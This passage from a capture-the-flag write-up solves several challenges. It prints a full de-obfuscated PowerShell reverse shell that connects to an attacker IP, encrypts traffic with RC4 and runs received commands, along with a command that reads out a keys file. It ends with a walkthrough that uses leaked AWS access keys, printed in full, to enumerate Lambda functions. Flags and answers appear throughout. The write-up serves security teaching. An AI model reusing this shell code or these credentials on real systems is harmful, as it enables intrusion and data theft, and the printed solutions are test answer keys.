AQgBCADgAQgBCACAAQAAoADEAOAA2ACwAMQA0ADEALAAxADQAMQAsADEANAA0ACwAMQA0ADEAKQAgAC0AQgBCADgAQgBCADgAQgA4AEIAQgBCADgAQgA4AEIAOAAgADIANQA1ACkACgAgACAAIAAgACAAIAB9AAoAIAAgACAAIAAgACAAIAAgACAAIAAkAEIAQgBCAEIAOABCAEIAOAA4AEIAQgA4ADgAOABCADgAIAA9ACAAbABsAGwASQBJAGwASQBJAGwASQBsAGwAbABsAGwAbAAgAC0AQgA4ADgAOABCAEIAQgBCAEIAOABCADgAQgA4AEIAQgAgACQAQgBCADgAOABCADgAQgA4AEIAQgBCAEIAOAA4ADgAQgAuAFQAcgBpAG0AKAApAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAQgBCAEIAQgA4ADgAOAA4ADgAOABCADgAOABCAEIAQgAuAFcAcgBpAHQAZQAoACQAQgBCAEIAQgA4AEIAQgA4ADgAQgBCADgAOAA4AEIAOAAsACAAMAAsACAAJABCAEIAQgBCADgAQgBCADgAOABCAEIAOAA4ADgAQgA4AC4ATABlAG4AZwB0AGgAKQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABCAEIAQgBCADgAOAA4ADgAOAA4AEIAOAA4AEIAQgBCAC4AQwBsAG8AcwBlACgAKQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABCAEIAQgBCADgAQgBCAEIAQgBCAEIAOABCADgAOABCAC4AQwBsAG8AcwBlACgAKQA=
  2>$null
SStteepp 22:: EExxttrraacctt aanndd aannaallyyzzee tthhee PPoowweerrSShheellll ppaayyllooaadd The decoded base64 reveals
obfuscated PowerShell code with the following key components:
     $BBB88B8B888BBB88 = 0xf1,
                      0x6e,
        0xcd,
1    0xc6,0x79,0x4c,0x66,0xd1,0x02,
2             0xf8,0x33,0xc4,0x86,
3                    0xe7,0xa4,
4                         0x35,0x8d,
5     0x69,0xbd,0xd2,0x1d,0x50,0xf5,0xfb,0xdf,0xec,0xaf,
6        0x0b,0x9e,0x53,
7       0xa4,0xd3
8     function IIlIlIlIllIIllIl {
9        param([int[]]$BBBB8888BBBBB8BB, [int]$BB8BB8B8BBB8B8B8)
10                      $B8B8B8B8B8B8B8BB = ""
11               foreach ($B888BB88888BBBBB in $BBBB8888BBBBB8BB) {
12                          $B8B8B8B8B8B8B8BB += [char]($B888BB88888BBBBB -bxor $BB8BB8B8BBB8B8B8)
13             }
14                           return $B8B8B8B8B8B8B8BB
15                    }
16      function lIIIlllIIIIllllI {
17       param (
18                           [byte[]]$B8BBB8B8BB8BBB88,
19                   [byte[]]$BBB8BBB8B88B88B8
20          )
21                   $BBB88BB88BB8BBB8 = 0..255
22                   $B888B8BB888BB88B = 0
23             for ($B8BB8BBB8BB8BBBB = 0; $B8BB8BBB8BB8BBBB -lt 256; $B8BB8BBB8BB8BBBB++) {
24                             $B888B8BB888BB88B = ($B888B8BB888BB88B + $BBB88BB88BB8BBB8[$B8BB8BBB8BB8BBBB] + $B8BBB8B8BB8BBB88[$B8BB8BBB8BB8BBBB %
25  $B8BBB8B8BB8BBB88.Length]) % 256
26                               $BBB88BB88BB8BBB8[$B8BB8BBB8BB8BBBB], $BBB88BB88BB8BBB8[$B888B8BB888BB88B] = $BBB88BB88BB8BBB8[$B888B8BB888BB88B], $BBB88BB88BB8BBB8
27  [$B8BB8BBB8BB8BBBB]
28       }
29                       $B8BB8BBB8BB8BBBB = 0
30                      $B888B8BB888BB88B = 0
31                          $BBBBB8BBB8BBB88B = @()
32             foreach ($BBBB88888B888BBB in $BBB8BBB8B88B88B8) {
33                               $B8BB8BBB8BB8BBBB = ($B8BB8BBB8BB8BBBB + 1) % 256
34                                $B888B8BB888BB88B = ($B888B8BB888BB88B + $BBB88BB88BB8BBB8[$B8BB8BBB8BB8BBBB]) % 256
35                              $BBB88BB88BB8BBB8[$B8BB8BBB8BB8BBBB], $BBB88BB88BB8BBB8[$B888B8BB888BB88B] = $BBB88BB88BB8BBB8[$B888B8BB888BB88B], $BBB88BB88BB8BBB8
36  [$B8BB8BBB8BB8BBBB]
37                          $B88BBB888BBB88B8 = $BBB88BB88BB8BBB8[($BBB88BB88BB8BBB8[$B8BB8BBB8BB8BBBB] + $BBB88BB88BB8BBB8[$B888B8BB888BB88B]) % 256]
38                         $BBBBB8BBB8BBB88B += ($BBBB88888B888BBB -bxor $B88BBB888BBB88B8)
39            }
40               return ,$BBBBB8BBB8BBB88B
41                  }
42      function lllIIlIIlIllllll {
43                    param ([string]$B888BBBBB8B8B8BB)
44                $B888B8B8B88B8BB8 = [System.Text.Encoding]::UTF8.GetBytes($B888BBBBB8B8B8BB)
45                     $BBBB8888BBBBB8BB = (lIIIlllIIIIllllI -B8BBB8B8BB8BBB88 $BBB88B8B888BBB88 -BBB8BBB8B88B88B8 $B888B8B8B88B8BB8) + (0x02,0x04,0x06,0x08)
46                       $B88BBBBBB888888B = [System.BitConverter]::GetBytes([int16]$BBBB8888BBBBB8BB.Length)
47          [Array]::Reverse($B88BBBBBB888888B)
48         return (0x17, 0x03, 0x03) + $B88BBBBBB888888B + $BBBB8888BBBBB8BB
49                  }
50               function llIIlllllIIIlllI {
51                   $B88B888B8888B888 = (IIlIlIlIllIIllIl -BBBB8888BBBBB8BB @(168,187,172,183,184,167,240,186,171,169,176,177,176,186,187,172,240,189,177,179) -
52  BB8BB8B8BBB8B8B8 222)
53            $BBBB8B8BB888B88B = [System.Text.Encoding]::ASCII.GetBytes($B88B888B8888B888)
54              $BB88BBBB88B8888B = [byte[]] ([BitConverter]::GetBytes([UInt16]$BBBB8B8BB888B88B.Length))
55                            [Array]::Reverse($BB88BBBB88B8888B)
56                         $B88888B888888BB8 = @(0x00) + $BB88BBBB88B8888B + $BBBB8B8BB888B88B
57                     $BB8BBBB8B8888BB8 = [byte[]] ([BitConverter]::GetBytes([UInt16]$B88888B888888BB8.Length))
58                         [Array]::Reverse($BB8BBBB8B8888BB8)
59           $B8888B88BB888B88 = $BB8BBBB8B8888BB8 + $B88888B888888BB8
60                $B888B888BBB8B8BB = [byte[]] ([BitConverter]::GetBytes([UInt16]$B8888B88BB888B88.Length))
61          [Array]::Reverse($B888B888BBB8B8BB)
62                       $B8BB88BBBB8B88B8 = @(0x00,
63                  0x00) + $B888B888BBB8B8BB + $B8888B88BB888B88
64                   $BBBB88B8BB88B88B = @(0x00, 0x0b,0x00,0x04,0x03,0x00,0x01,0x02,
65                                   0x00,0x0a,0x00,0x16,0x00,0x14,0x00,0x1d,0x00,0x17,0x00,0x1e,0x00,0x19,0x00,0x18,0x01,0x00,0x01,0x01,0x01,0x02,0x01,0x03,0x01,0x04,
66                                              0x00,0x23,0x00,0x00,
67                                0x00,0x16,0x00,0x00,
68                                        0x00,0x17,0x00,0x00,
69
70  0x00,0x0d,0x00,0x1e,0x00,0x1c,0x04,0x03,0x05,0x03,0x06,0x03,0x08,0x07,0x08,0x08,0x08,0x09,0x08,0x0a,0x08,0x0b,0x08,0x04,0x08,0x05,0x08,0x06,0x04,0x01,0x05,0x01,0x06,0x01,
71                                        0x00,0x2b,0x00,0x03,0x02,0x03,0x04,
72                               0x00,0x2d,0x00,0x02,0x01,0x01,
73                                     0x00,0x33,0x00,0x26,0x00,0x24,0x00,0x1d,0x00,0x20,
74
75  0x35,0x80,0x72,0xd6,0x36,0x58,0x80,0xd1,0xae,0xea,0x32,0x9a,0xdf,0x91,0x21,0x38,0x38,0x51,0xed,0x21,0xa2,0x8e,0x3b,0x75,0xe9,0x65,0xd0,0xd2,0xcd,0x16,0x62,0x54)
76             $BB88BB8BB88BB88B = $B8BB88BBBB8B88B8 + $BBBB88B8BB88B88B
77            $BBBB8B88888888B8 = [byte[]] ([BitConverter]::GetBytes([UInt16]$BB88BB8BB88BB88B.Length))
78           [Array]::Reverse($BBBB8B88888888B8)
79       $B8888BBB888B8888 = @(0x03,0x03,0x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,0x09,0x0a,0x0b,0x0c,
80                          0x0d,0x0e,0x0f,
81                 0x10,0x11,0x12,0x13,0x14,0x15,0x16,0x17,
82                          0x18,
83                 0x19,0x1a,0x1b,0x1c,0x1d,0x1e,0x1f,0x20,0xe0,0xe1,
84                     0xe2,0xe3,0xe4,0xe5,0xe6,0xe7,0xe8,0xe9,0xea,0xeb,0xec,0xed,0xee,0xef,0xf0,0xf1,0xf2,0xf3,0xf4,0xf5,0xf6,0xf7,0xf8,0xf9,0xfa,
85                       0xfb,0xfc,0xfd,0xfe,0xff,0x00,0x08,0x13,0x02,0x13,0x03,0x13,0x01,0x00,0xff,0x01,0x00)
86            $BB8B8BBBB88B8B8B = $B8888BBB888B8888 + $BBBB8B88888888B8 + $BB88BB8BB88BB88B
87               $BB8BBB88B8B8B888 = [byte[]] ([BitConverter]::GetBytes($BB8B8BBBB88B8B8B.Length))
88          [Array]::Reverse($BB8BBB88B8B8B888)
89       $BBB88BBB888B8B8B = @(0x01) + $BB8BBB88B8B8B888[1..3] + $BB8B8BBBB88B8B8B
90          $B88B888B8BB8BBBB = [byte[]] ([BitConverter]::GetBytes([UInt16]$BBB88BBB888B8B8B.Length))
91           [Array]::Reverse($B88B888B8BB8BBBB)
92                        $BBB888888BB88B88 = @(0x16,
93                     0x03, 0x01) + $B88B888B8BB8BBBB + $BBB88BBB888B8B8B
94         return ,$BBB888888BB88B88
95                   }
96   $BBBB8BBBBBB8B88B = New-Object System.Net.Sockets.TcpClient
97                      $BBBB8BBBBBB8B88B.Connect((IIlIlIlIllIIllIl -BBBB8888BBBBB8BB @(5,7,25,2,25,3,15,25,5,7,7) -BB8BB8B8BBB8B8B8 55), ((50 * 9) - (11 * 2)) + [math]::Pow
98  (2, 3) + [math]::Sqrt(49))
99        $BBBB888888B88BBB = $BBBB8BBBBBB8B88B.GetStream()
100  $BB88888BB8B8B8BB = llIIlllllIIIlllI
101         $BBBB888888B88BBB.Write($BB88888BB8B8B8BB, 0, $BB88888BB8B8B8BB.Length)
102         $B8B888BB8B8888BB = New-Object byte[] 16384
103           $BBBB888888B88BBB.Read($B8B888BB8B8888BB, 0, $B8B888BB8B8888BB.Length) | Out-Null
104                   while ($true) {
105               $B8B888BB8B8888BB = New-Object byte[] 16384
106       try {
107                      $B888BBB8B8B88B8B = $BBBB888888B88BBB.Read($B8B888BB8B8888BB, 0, 16384)
108                  } catch {
109                     break
110               }
111                         $BBBB8888BBBBB8BB = $B8B888BB8B8888BB[5..($B888BBB8B8B88B8B - 1)]
112                 $B8B88B8BB888BBB8 = [System.Text.Encoding]::UTF8.GetString((lIIIlllIIIIllllI -B8BBB8B8BB8BBB88 $BBB88B8B888BBB88 -BBB8BBB8B88B88B8 $BBBB8888BBBBB8BB))
113                          if ($B8B88B8BB888BBB8 -eq (IIlIlIlIllIIllIl -BBBB8888BBBBB8BB @(109,112,97,124) -BB8BB8B8BBB8B8B8 8)) { break }
114                       try {
115                              $BB88B8B8BBBB888B = (Invoke-Expression $B8B88B8BB888BBB8 2>&1) | Out-String
116                       } catch {
117                    $BB88B8B8BBBB888B = (IIlIlIlIllIIllIl -BBBB8888BBBBB8BB @(186,141,141,144,141) -BB8BB8B8BBB8B8B8 255)
118       }
119           $BBBB8BB88BB888B8 = lllIIlIIlIllllll -B888BBBBB8B8B8BB $BB88B8B8BBBB888B.Trim()
                           $BBBB888888B88BBB.Write($BBBB8BB88BB888B8, 0, $BBBB8BB88BB888B8.Length)
                }
                  $BBBB888888B88BBB.Close()
                    $BBBB8BBBBBB8B88B.Close()
Key findings:
    * RC4 encryption key: $BBB88B8B888BBB88
    * Connection to attacker IP: 20.5.48.200 on port 443
    * TLS handshake simulation and encrypted command execution
SStteepp 33:: EExxttrraacctt tthhee RRCC44 kkeeyy aanndd eennccrryypptteedd ddaattaa From the PowerShell code, we
extract the RC4 key:
  RC4_KEY = [0xf1, 0x6e, 0xcd, 0xc6, 0x79, 0x4c, 0x66, 0xd1, 0x02, 0xf8, 0x33,
1 0xc4, 0x86, 0xe7, 0xa4, 0x35, 0x8d, 0x69, 0xbd, 0xd2, 0x1d, 0x50, 0xf5, 0xfb,
  0xdf, 0xec, 0xaf, 0x0b, 0x9e, 0x53, 0xa4, 0xd3]
SStteepp 44:: DDeeccrryypptt tthhee TTLLSS ttrraaffffiicc We find encrypted data packets starting with
17030300 (TLS Application Data). The raw encrypted hex data:
1 17030300d84b3595b2c7d8941fc50194795a788096a970b42074c522d6d34775419212149581d5f629d01c75eda554a1a2f07d5258f278b022022f65d9d589f645f79241cb0a39d4850018ed6f342737ee9335225aed762aaa139bdddf799e08d9b6056ea462e8508b3017000601073e1ff741660d29045023182476ae5407c6b849363cfc9701a73eb688bf20d086d7ef04e18d640465e162999b3e0229733065f0fc330f97e270070f1ee60966b43a8ea7023890b1ad1e2858645a0846da14852d0f3bf000948c8818e6c03955e64143c2736f8bdb48daa202040608
     NNoottee:: This hex data is just one part of the entire communication
     between the malware and C2 server. This specific packet contains the
     command response that includes our flag data.
Using Python with the RC4 key:
1  from Crypto.Cipher import ARC4
2
3  RC4_KEY = bytes([
4      0xf1, 0x6e, 0xcd, 0xc6, 0x79, 0x4c, 0x66, 0xd1, 0x02, 0xf8, 0x33, 0xc4, 0x86, 0xe7, 0xa4,
5      0x35, 0x8d, 0x69, 0xbd, 0xd2, 0x1d, 0x50, 0xf5, 0xfb, 0xdf, 0xec, 0xaf, 0x0b, 0x9e, 0x53,
6      0xa4, 0xd3
7  ])
8
9  def decrypt_rc4(hex_str):
10     cipher = ARC4.new(RC4_KEY)
11     decrypted = cipher.decrypt(bytes.fromhex(hex_str))
12     try:
13         return decrypted.decode("utf-8")
14     except UnicodeDecodeError:
15         return decrypted.hex()
16
17 # Skip first 10 chars (17030300XX) and decrypt the rest
18 encrypted_hex =
19 "4b3595b2c7d8941fc50194795a788096a970b42074c522d6d34775419212149581d5f629d01c75eda554a1a2f07d5258f278b022022f65d9d589f645f79241cb0a39d4850018ed6f342737ee9335225aed762aaa139bdddf799e08d9b6056ea462e8508b3017000601073e1ff741660d29045023182476ae5407c6b849363cfc9701a73eb688bf20d086d7ef04e18d640465e162999b3e0229733065f0fc330f97e270070f1ee60966b43a8ea7023890b1ad1e2858645a0846da14852d0f3bf000948c8818e6c03955e64143c2736f8bdb48daa202040608"
   decrypted = decrypt_rc4(encrypted_hex)
SStteepp 55:: DDeeccooddee tthhee eexxffiillttrraatteedd ddaattaa The decrypted data reveals a PowerShell
command that reads and base64-encodes a file:
1 [Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:
  \Users\jdoe\Documents\keys_backup.tar.gz"))
The response contains the base64-encoded file:
1 H4sIAAAAAAAAA+3OMQrCQBSE4dSeIieQt3m78QCKlYVorBdZjYVgkeyCQby7iyCIfdTi/
  5qBaWbOx6GfxmssRiRZbe0zs88UcVoYJ6q1VlJp7mc2V6WMeeol9XHfleU3pv7RYjdvljfjT0md84MkH+zFHzRshnXjm9XWx862rQn3ya+vAgAAAAAAAAAAAAAAAADePAC9uw8vACgAAA==
SStteepp 66:: EExxttrraacctt aanndd ddeeccoommpprreessss tthhee ffllaagg Decode the base64 and save as a gzipped
tar file:
1 import base64
2
3 base64_data = "H4sIAAAAAAAAA+3OMQrCQBSE4dSeIieQt3m78QCKlYVorBdZjYVgkeyCQby7iyCIfdTi/
4 5qBaWbOx6GfxmssRiRZbe0zs88UcVoYJ6q1VlJp7mc2V6WMeeol9XHfleU3pv7RYjdvljfjT0md84MkH+zFHzRshnXjm9XWx862rQn3ya+vAgAAAAAAAAAAAAAAAADePAC9uw8vACgAAA=="
5
6 file_bytes = base64.b64decode(base64_data)
7 with open("keys_backup.tar.gz", "wb") as f:
      f.write(file_bytes)
Finally, extract the archive:
1 tar -xzf keys_backup.tar.gz
This extracts a keys.txt file. Reading the file contents:
1 cat keys.txt
Reveals our flag.
FFllaagg:: DUCTF{1_gu355_y0u_c4n_d3cRyPT_TLS_tr4ff1c}
_[_f_i_s_h_y_]
CChhaalllleennggee 22:: YYooDDaawwgg
SSoollvveess:: 141
CCaatteeggoorryy:: Misc
DDeessccrriippttiioonn
     We found this file on a USB drive, it seems to be some sort of
     gamified cyber skilled based learning system thingy? Maybe if all of
     the challenges are sold we will get some answers, or maybe it is just
     the friends we make along the way. Note - This may produce false
     positives with your virus scanner.
     FFiilleess pprroovviiddeedd:: yo-dawg.zip
SSoolluuttiioonn
This challenge presents a “CTF within a CTF” - a .NET executable containing
multiple mini-challenges that must be solved to unlock the final flag.
FFiillee CCoonntteennttss::
1 ├── Yo Dawg.deps.json
2 ├── Yo Dawg.dll
3 ├── Yo Dawg.exe
4 └── Yo Dawg.runtimeconfig.json
Upon running the executable, we’re presented with a challenge board containing
multiple cryptographic puzzles:
SSuubb--CChhaalllleennggee 11:: SSaallaaddss ((220000 ppooiinnttss))
DDeessccrriippttiioonn:: “I’m always thinking about food, this isn’t helping… I got passed
this note when I was working at the cafe, what kind of salad is this?! Can you
decrypt?: putkw{jltyzjczwv}”
SSoolluuttiioonn:: This is a Caesar cipher (ROT13 variant) with a shift of 9.
    * Decrypting: putkw{jltyzjczwv} → ydctf{suchislife}
SSuubb--CChhaalllleennggee 22:: PPaasssswwoorrddss ((220000 ppooiinnttss))
DDeessccrriippttiioonn:: “Another breach, another password reset. I wonder what password
they grabbed?
5E320E0CCC5EE5291FAE1E60A1CD72EB1F6FA4AE26EA180F86CE694832DC4E72DCCFDBF3EABBE12FD86F1D51806F15F3294C5F7038BF21DA6AA75D1F09DF07C2”
SSoolluuttiioonn:: This is an SHA-256 hash that can be cracked using rainbow tables
(CrackStation):
    * Hash:
      5E320E0CCC5EE5291FAE1E60A1CD72EB1F6FA4AE26EA180F86CE694832DC4E72DCCFDBF3EABBE12FD86F1D51806F15F3294C5F7038BF21DA6AA75D1F09DF07C2
    * Plaintext: ihatehackers
    * FFllaagg:: ydctf{ihatehackers}
SSuubb--CChhaalllleennggee 33:: RRootttteenn ((220000 ppooiinnttss))
DDeessccrriippttiioonn:: “Study Cyber they said. Get to hack stuff they said. Then why am I
needing to decode ciphers? HOW IS THIS HELPING? I mean, can you solve the
following? J54E7L5@0J@F0ECFDE0>J04@56nN”
SSoolluuttiioonn:: This is ROT47 encoding:
    * Decrypting: J54E7L5@0J@F0ECFDE0>J04@56nN → ydctf{do_you_trust_my_code?}
SSuubb--CChhaalllleennggee 44:: WWeellccoommee ((5500 ppooiinnttss))
DDeessccrriippttiioonn:: “Heard you like CTFs, so here’s another CTF in the DUCTF! The flag
format for this CTF is ydctf{some_text}. Good luck! …oh, your first flag? Here
it is!”
SSoolluuttiioonn:: The flag is directly provided: ydctf{s0mething_1s_wr0ng}
SSuubb--CChhaalllleennggee 55:: HHiiddddeenn ((220000 ppooiinnttss))
DDeessccrriippttiioonn:: “There’s a flag somewhere hidden here… I wonder where it is? Time
to channel Inspector Morse!”
SSoolluuttiioonn:: By resizing the application window, Morse code becomes visible at the
bottom:
    * Morse code: -.-- -.. -.-. - ..-. .... .. -.. -.. . -. ..-. .-.. .- --. -.
      --- - ... --- .... .. -.. -.. . -.
    * Decoded: YDCTF HIDDENFLAGNOTSOHIDDEN
    * FFllaagg:: ydctf{hiddenflagnotsohidden}
After completing these challenges, an “angry koala” jump scare appears. (i got
scared for a sec ngl)
_[_s_c_a_r_y_]
SSuubb--CChhaalllleennggee 66:: DDeeeeppeerr ((220000 ppooiinnttss))
DDeessccrriippttiioonn:: “I wonder if you’re connected to the Internet… Can you solve the
easiest RSA ever? Go get it :) http://pastebin.com/tK8PFRhA”
SSoolluuttiioonn:: The pastebin contains RSA parameters:
  n =
1 134995596339263906364650042879218690804636051969803060327341006918906219701871373267641203454219249589885364856414727976145795558649019334400706818997156295194002540549348224335820431341746858682831145870760296688552893053945533239982236058292620771496924967301973679586874984087016314758930354348923476779669
2 e = 65537
3 c =
4 69942350419946767506345128529425495489283491089474687791937626592410531523906950815924944348938594154233834152367027685926503406302513787705918832376135541106323504321024539733768444780639669173742768253534729267483408610794975624076605589114620168690234573082137589585730517788273985226086330327586276612491
5 p = 12347237270477958961788304962214070527659642053458163016362914018933001634467295346381421813235616243811654194550990042394688050113879996006954916978208993
  q = 10933263318915572696351286556191402769398472611952670383866334702901100179649513873715034012424560855818813105922996981430536446597319054410065510024545333
With p and q provided, we can easily decrypt:
    * FFllaagg:: ydctf{rsa_erry_day}
SSuubb--CChhaalllleennggee 77:: EEvveenn DDeeeeppeerr ((220000 ppooiinnttss))
DDeessccrriippttiioonn:: “Tell me your username. The flag format for this CTF is ydctf
{yourusername}”
SSoolluuttiioonn:: The application detects and uses the system username.
    * FFllaagg:: ydctf{[your_system_username]}
SSuubb--CChhaalllleennggee 88:: TTrruutthh ffrroomm VVaaaass ((220000 ppooiinnttss))
DDeessccrriippttiioonn:: “Did I ever tell you the definition of insanity? Who was the voice
actor who played Vaas Montenegro?”
SSoolluuttiioonn:: This references the Far Cry 3 villain Vaas Montenegro.
    * Voice actor: Michael Mando
    * FFllaagg:: ydctf{michael_mando}
FFiinnaall CChhaalllleennggee:: IInncceeppttiioonn ((220000 ppooiinnttss)) -- HHaacckkeerrss CCTTFF 11999955
After completing all sub-challenges, the final “Inception” challenge unlocks
with three questions:
QQuueessttiioonn 11:: “Can you DES? CMpZlgYbgEc6eTSNUPXvww== with key ‘hack\0\0\0\0’”
1  from Crypto.Cipher import DES
2  import base64
3
4  key = b'hack\x00\x00\x00\x00'  # 8 bytes
5  iv = b'\x00' * 8               # 8 bytes IV (all zeros)
6  ciphertext = base64.b64decode('CMpZlgYbgEc6eTSNUPXvww==')
7  des = DES.new(key, DES.MODE_CBC, iv)
8  plaintext = des.decrypt(ciphertext)
9  pad_len = plaintext[-1]
10 plaintext = plaintext[:-pad_len]
11 print("Decrypted text:", plaintext.decode('utf-8'))
AAnnsswweerr:: flag{des4eva}
QQuueessttiioonn 22:: “What is the best line in the Hackers movie (three words)?” AAnnsswweerr::
Hack the planet!
QQuueessttiioonn 33:: “defcon 3 quiz: Which Casino is hosting (one word)?” AAnnsswweerr::
Tropicana
FFiinnaall DDeeccrryyppttiioonn:: After answering correctly, we get: “USE THE SAME PROCESS AS
QUESTION 1 WITH THE SAME KEY: UDR6b0hwIOkbJ90U/
dYB3iSF5iQ50Ci1b+T+YCQPJA3pl9IFtyJFrCWfB1szPlKy5EdvDb029rZ7w2gUAcSJiQ==”
Using the same DES decryption process:
FFllaagg:: DUCTF{1995_to_2025}
_[_d_a_w_g_]
CChhaalllleennggee 33:: MMaarryy hhaadd aa lliittttllee llaammbbddaa
SSoollvveess:: 130
CCaatteeggoorryy:: Misc / Cloud
DDeessccrriippttiioonn
     The Ministry of Australian Research into Yaks (MARY) is the leading
     authority of yak related research in Australia. They know a lot about
     long-haired domesticated cattle, but unfortunately not a lot about
     information security.
     They have been migrating their yak catalog application to a
     serverless, lambda based, architecture in AWS, but in the process
     have accidentally exposed an access key used by their admins. You’ve
     gotten a hold of this key, now use this access to uncover MARY’s
     secrets!
SSoolluuttiioonn
The challenge involved exploiting exposed AWS credentials to access a Lambda
function and retrieve sensitive information from AWS Systems Manager Parameter
Store.
SStteepp 11:: CCoonnffiigguurree AAWWSS PPrrooffiillee
First, I configured the AWS CLI with the provided credentials:
1 aws configure --profile mary
Using the credentials:
    * AWS Access Key ID: AKIAXC42U7VJ2XOBQKGI
    * AWS Secret Access Key: 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
    * Default region: us-east-1
SStteepp 22:: RReeccoonnnnaaiissssaannccee
First, I verified the identity of the compromised credentials to understand
what permissions I had:
1 aws sts get-caller-identity --profile mary
RReessppoonnssee::
1 {
2     "UserId": "AIDAXC42U7VJSYNSAD4EV",
3     "Account": "487266254163",
4     "Arn": "arn:aws:iam::487266254163:user/devopsadmin"
5 }
This confirmed I was authenticated as the devopsadmin user in AWS account
487266254163. The next step was to enumerate what AWS resources I could access
with these credentials.
I started by listing Lambda functions since the challenge description mentioned
a serverless, lambda-based architecture:
1 aws lambda list-functions --profile mary
RReessppoonnssee::
   {
1      "Functions": [
2          {
3              "FunctionName": "yakbase",
4              "FunctionArn": "arn:aws:lambda:us-east-1:487266254163:function:
5  yakbase",
6              "Runtime": "python3.13",
7              "Role": "arn:aws:iam::487266254163:role/lambda_role",
8              "Handler": "yakbase.lambda_handler",
9              "CodeSize": 623,
10             "Description": "",
11             "Timeout": 30,
12             "MemorySize": 128,
13             "LastModified": "2025-07-14T12:42:45.148+0000",
14             "CodeSha256": "TJjcu+uixucgk+66VOvlNYdT4ifRe6bgdAQxWujMwVM=",
15             "Version": "$LATEST",
16             "TracingConfig": {
17                 "Mode": "PassThrough"
18             },
19             "RevisionId": "6e45ccea-697d-4cd8-b606-67577b601b0b",
20             "Layers": [
21                 {
22                     "Arn": "arn:aws:lambda:us-east-1:487266254163:layer:
23 main-layer:1",
24                     "CodeSize": 689581
25                 }
26             ],
27             "PackageType": "Zip",
28             "Architectures": [
29                 "x86_64"
30             ],
31             "EphemeralStorage": {
32                 "Size": 512
33             },
34             "SnapStart": {
35                 "ApplyOn": "None",
36                 "OptimizationStatus": "Off"
37             },
38             "LoggingConfig": {
39                 "LogFormat": "Text",
40                 "LogGroup": "/aws/lambda/yakbase"
41             }
42         }
43     ]
   }
Perfect! I found a Lambda function named yakbase that appeared to be related to
the yak catalog application mentioned in the challenge. Key details from this
response:
    * Function name: yakbase
    * Execution role: arn:aws:iam::487266254163:role/lambda_role (this would be
      important later)
    * Small code size (623 bytes) suggesting a simple function
    * Uses a layer (main-layer:1) which likely contains dependencies
To get more details and access the source code, I retrieved the full function
information:
1 aws lambda get-function --function-name yakbase --profile mary
RReessppoonnssee::
   {
1      "Configuration": {
2          "FunctionName": "yakbase",
3          "FunctionArn": "arn:aws:lambda:us-east-1:487266254163:function:yakbase",
4          "Runtime": "python3.13",
5          "Role": "arn:aws:iam::487266254163:role/lambda_role",
6          "Handler": "yakbase.lambda_handler",
7          "CodeSize": 623,
8          "Description": "",
9          "Timeout": 30,
10         "MemorySize": 128,
11         "LastModified": "2025-07-14T12:42:45.148+0000",
12         "CodeSha256": "TJjcu+uixucgk+66VOvlNYdT4ifRe6bgdAQxWujMwVM=",
13         "Version": "$LATEST",
14         "TracingConfig": {
15             "Mode": "PassThrough"
16         },
17         "RevisionId": "6e45ccea-697d-4cd8-b606-67577b601b0b",
18         "Layers": [
19             {
20                 "Arn": "arn:aws:lambda:us-east-1:487266254163:layer:main-layer:1",
21                 "CodeSize": 689581
22             }
23         ],
24         "State": "Active",
25         "LastUpdateStatus": "Successful",
26         "PackageType": "Zip",
27         "Architectures": [
28             "x86_64"
29         ],
30         "EphemeralStorage": {
31             "Size": 512
32         },
33         "SnapStart": {
34             "ApplyOn": "None",
35             "OptimizationStatus": "Off"
36         },
37         "RuntimeVersionConfig": {
38             "RuntimeVersionArn": "arn:aws:lambda:us-east-1::runtime:83a0b29e480e14176225231a6e561282aa7732a24063ebab771b15e4c1a2c71c"
39         },
40         "LoggingConfig": {
41             "LogFormat": "Text",
42             "LogGroup": "/aws/lambda/yakbase"
43         }
44     },
45     "Code": {
46         "RepositoryType": "S3",
47         "Location": "https://prod-04-2014-tasks.s3.us-east-1.amazonaws.com/snapshots/487266254163/yakbase-f70d7c3a-5267-425f-8ed2-4c7a9497db04?versionId=AWtrEWcqRUhNouC7YHffyafILNKu2lrj&X-Amz-Security-
48 Token=IQoJb3JpZ2luX2VjEKX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLWVhc3QtMSJIMEYCIQDrR3JeUNzELURw8dHrgfXpLewUdC25IcpQeYvmaZeQuwIhAK%2F%2FxCty6x6UXlpUgZLWp4%2FrcQuu9Hgsabcr2dQLvsHaKpICCL7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNzQ5Njc4OTAyODM5Igxy3J9GLQYJ5cL2E%2Fsq5gF02hVDVYiUwPzstakq0HBaQcYV6PLEAXVc4YY%2BbsBel8cqRX6tBrwk3rpI1LMLHu3rxJR8d%2Ff5MvUtapWjyRneWucEDTNFX%2FuC0GK3HXXioUrJJspXNiCEqH0thG2fD9IydA1V7e93swm0sgUpP3lXkmmHnyEO3ooTg7tOBOjY5MwNjXXQEOTvDk6b0w2rk3J1wbRVONN2%2B5j3BP%2Fa4S9q%2Fg5A7Y18T%2FfL5dA96dGFliEajZX8a4%2B1deuJLg5pDycN6NenqfmcMfAIW2kND6WiMxDOADALL9lRRUolMGU9%2FeB6w6okWzDkxPPDBjqOAYkGJ4W7ga00vcP4C2JojaY%2FrMubvslBORoYQtvmhIHD4H6DJJ%2FojO6o%2FPcSMDA7XHf1VnGq2OTihXTUMrMTYkdS8VKEvH9A3m7zvyl0R7ernODpHe2hkiegYMLy%2BBmBeyCPdX9WZP%2Bn4wcdGFX2I9TQa4hAlT3Yn2F1yGJMhnVAYAv0cYtlZNTPMJ7X6zY%3D&X-
49 Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Date=20250720T211710Z&X-Amz-SignedHeaders=host&X-Amz-Expires=600&X-Amz-Credential=ASIA25DCYHY35GMWNLBI%2F20250720%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Signature=388ac43c28744f4f10a09400c9929438f6fa00b6f0b4899858f5da9f819abb91"
50     },
51     "Tags": {
52         "Challenge": "Mary had a little lambda"
53     }
   }
Excellent! This response provided crucial information:
   1. CCooddee LLooccaattiioonn: The Code.Location field contained a pre-signed S3 URL
      where I could download the Lambda function’s source code
   2. CChhaalllleennggee CCoonnffiirrmmaattiioonn: The Tags field confirmed this was indeed part of
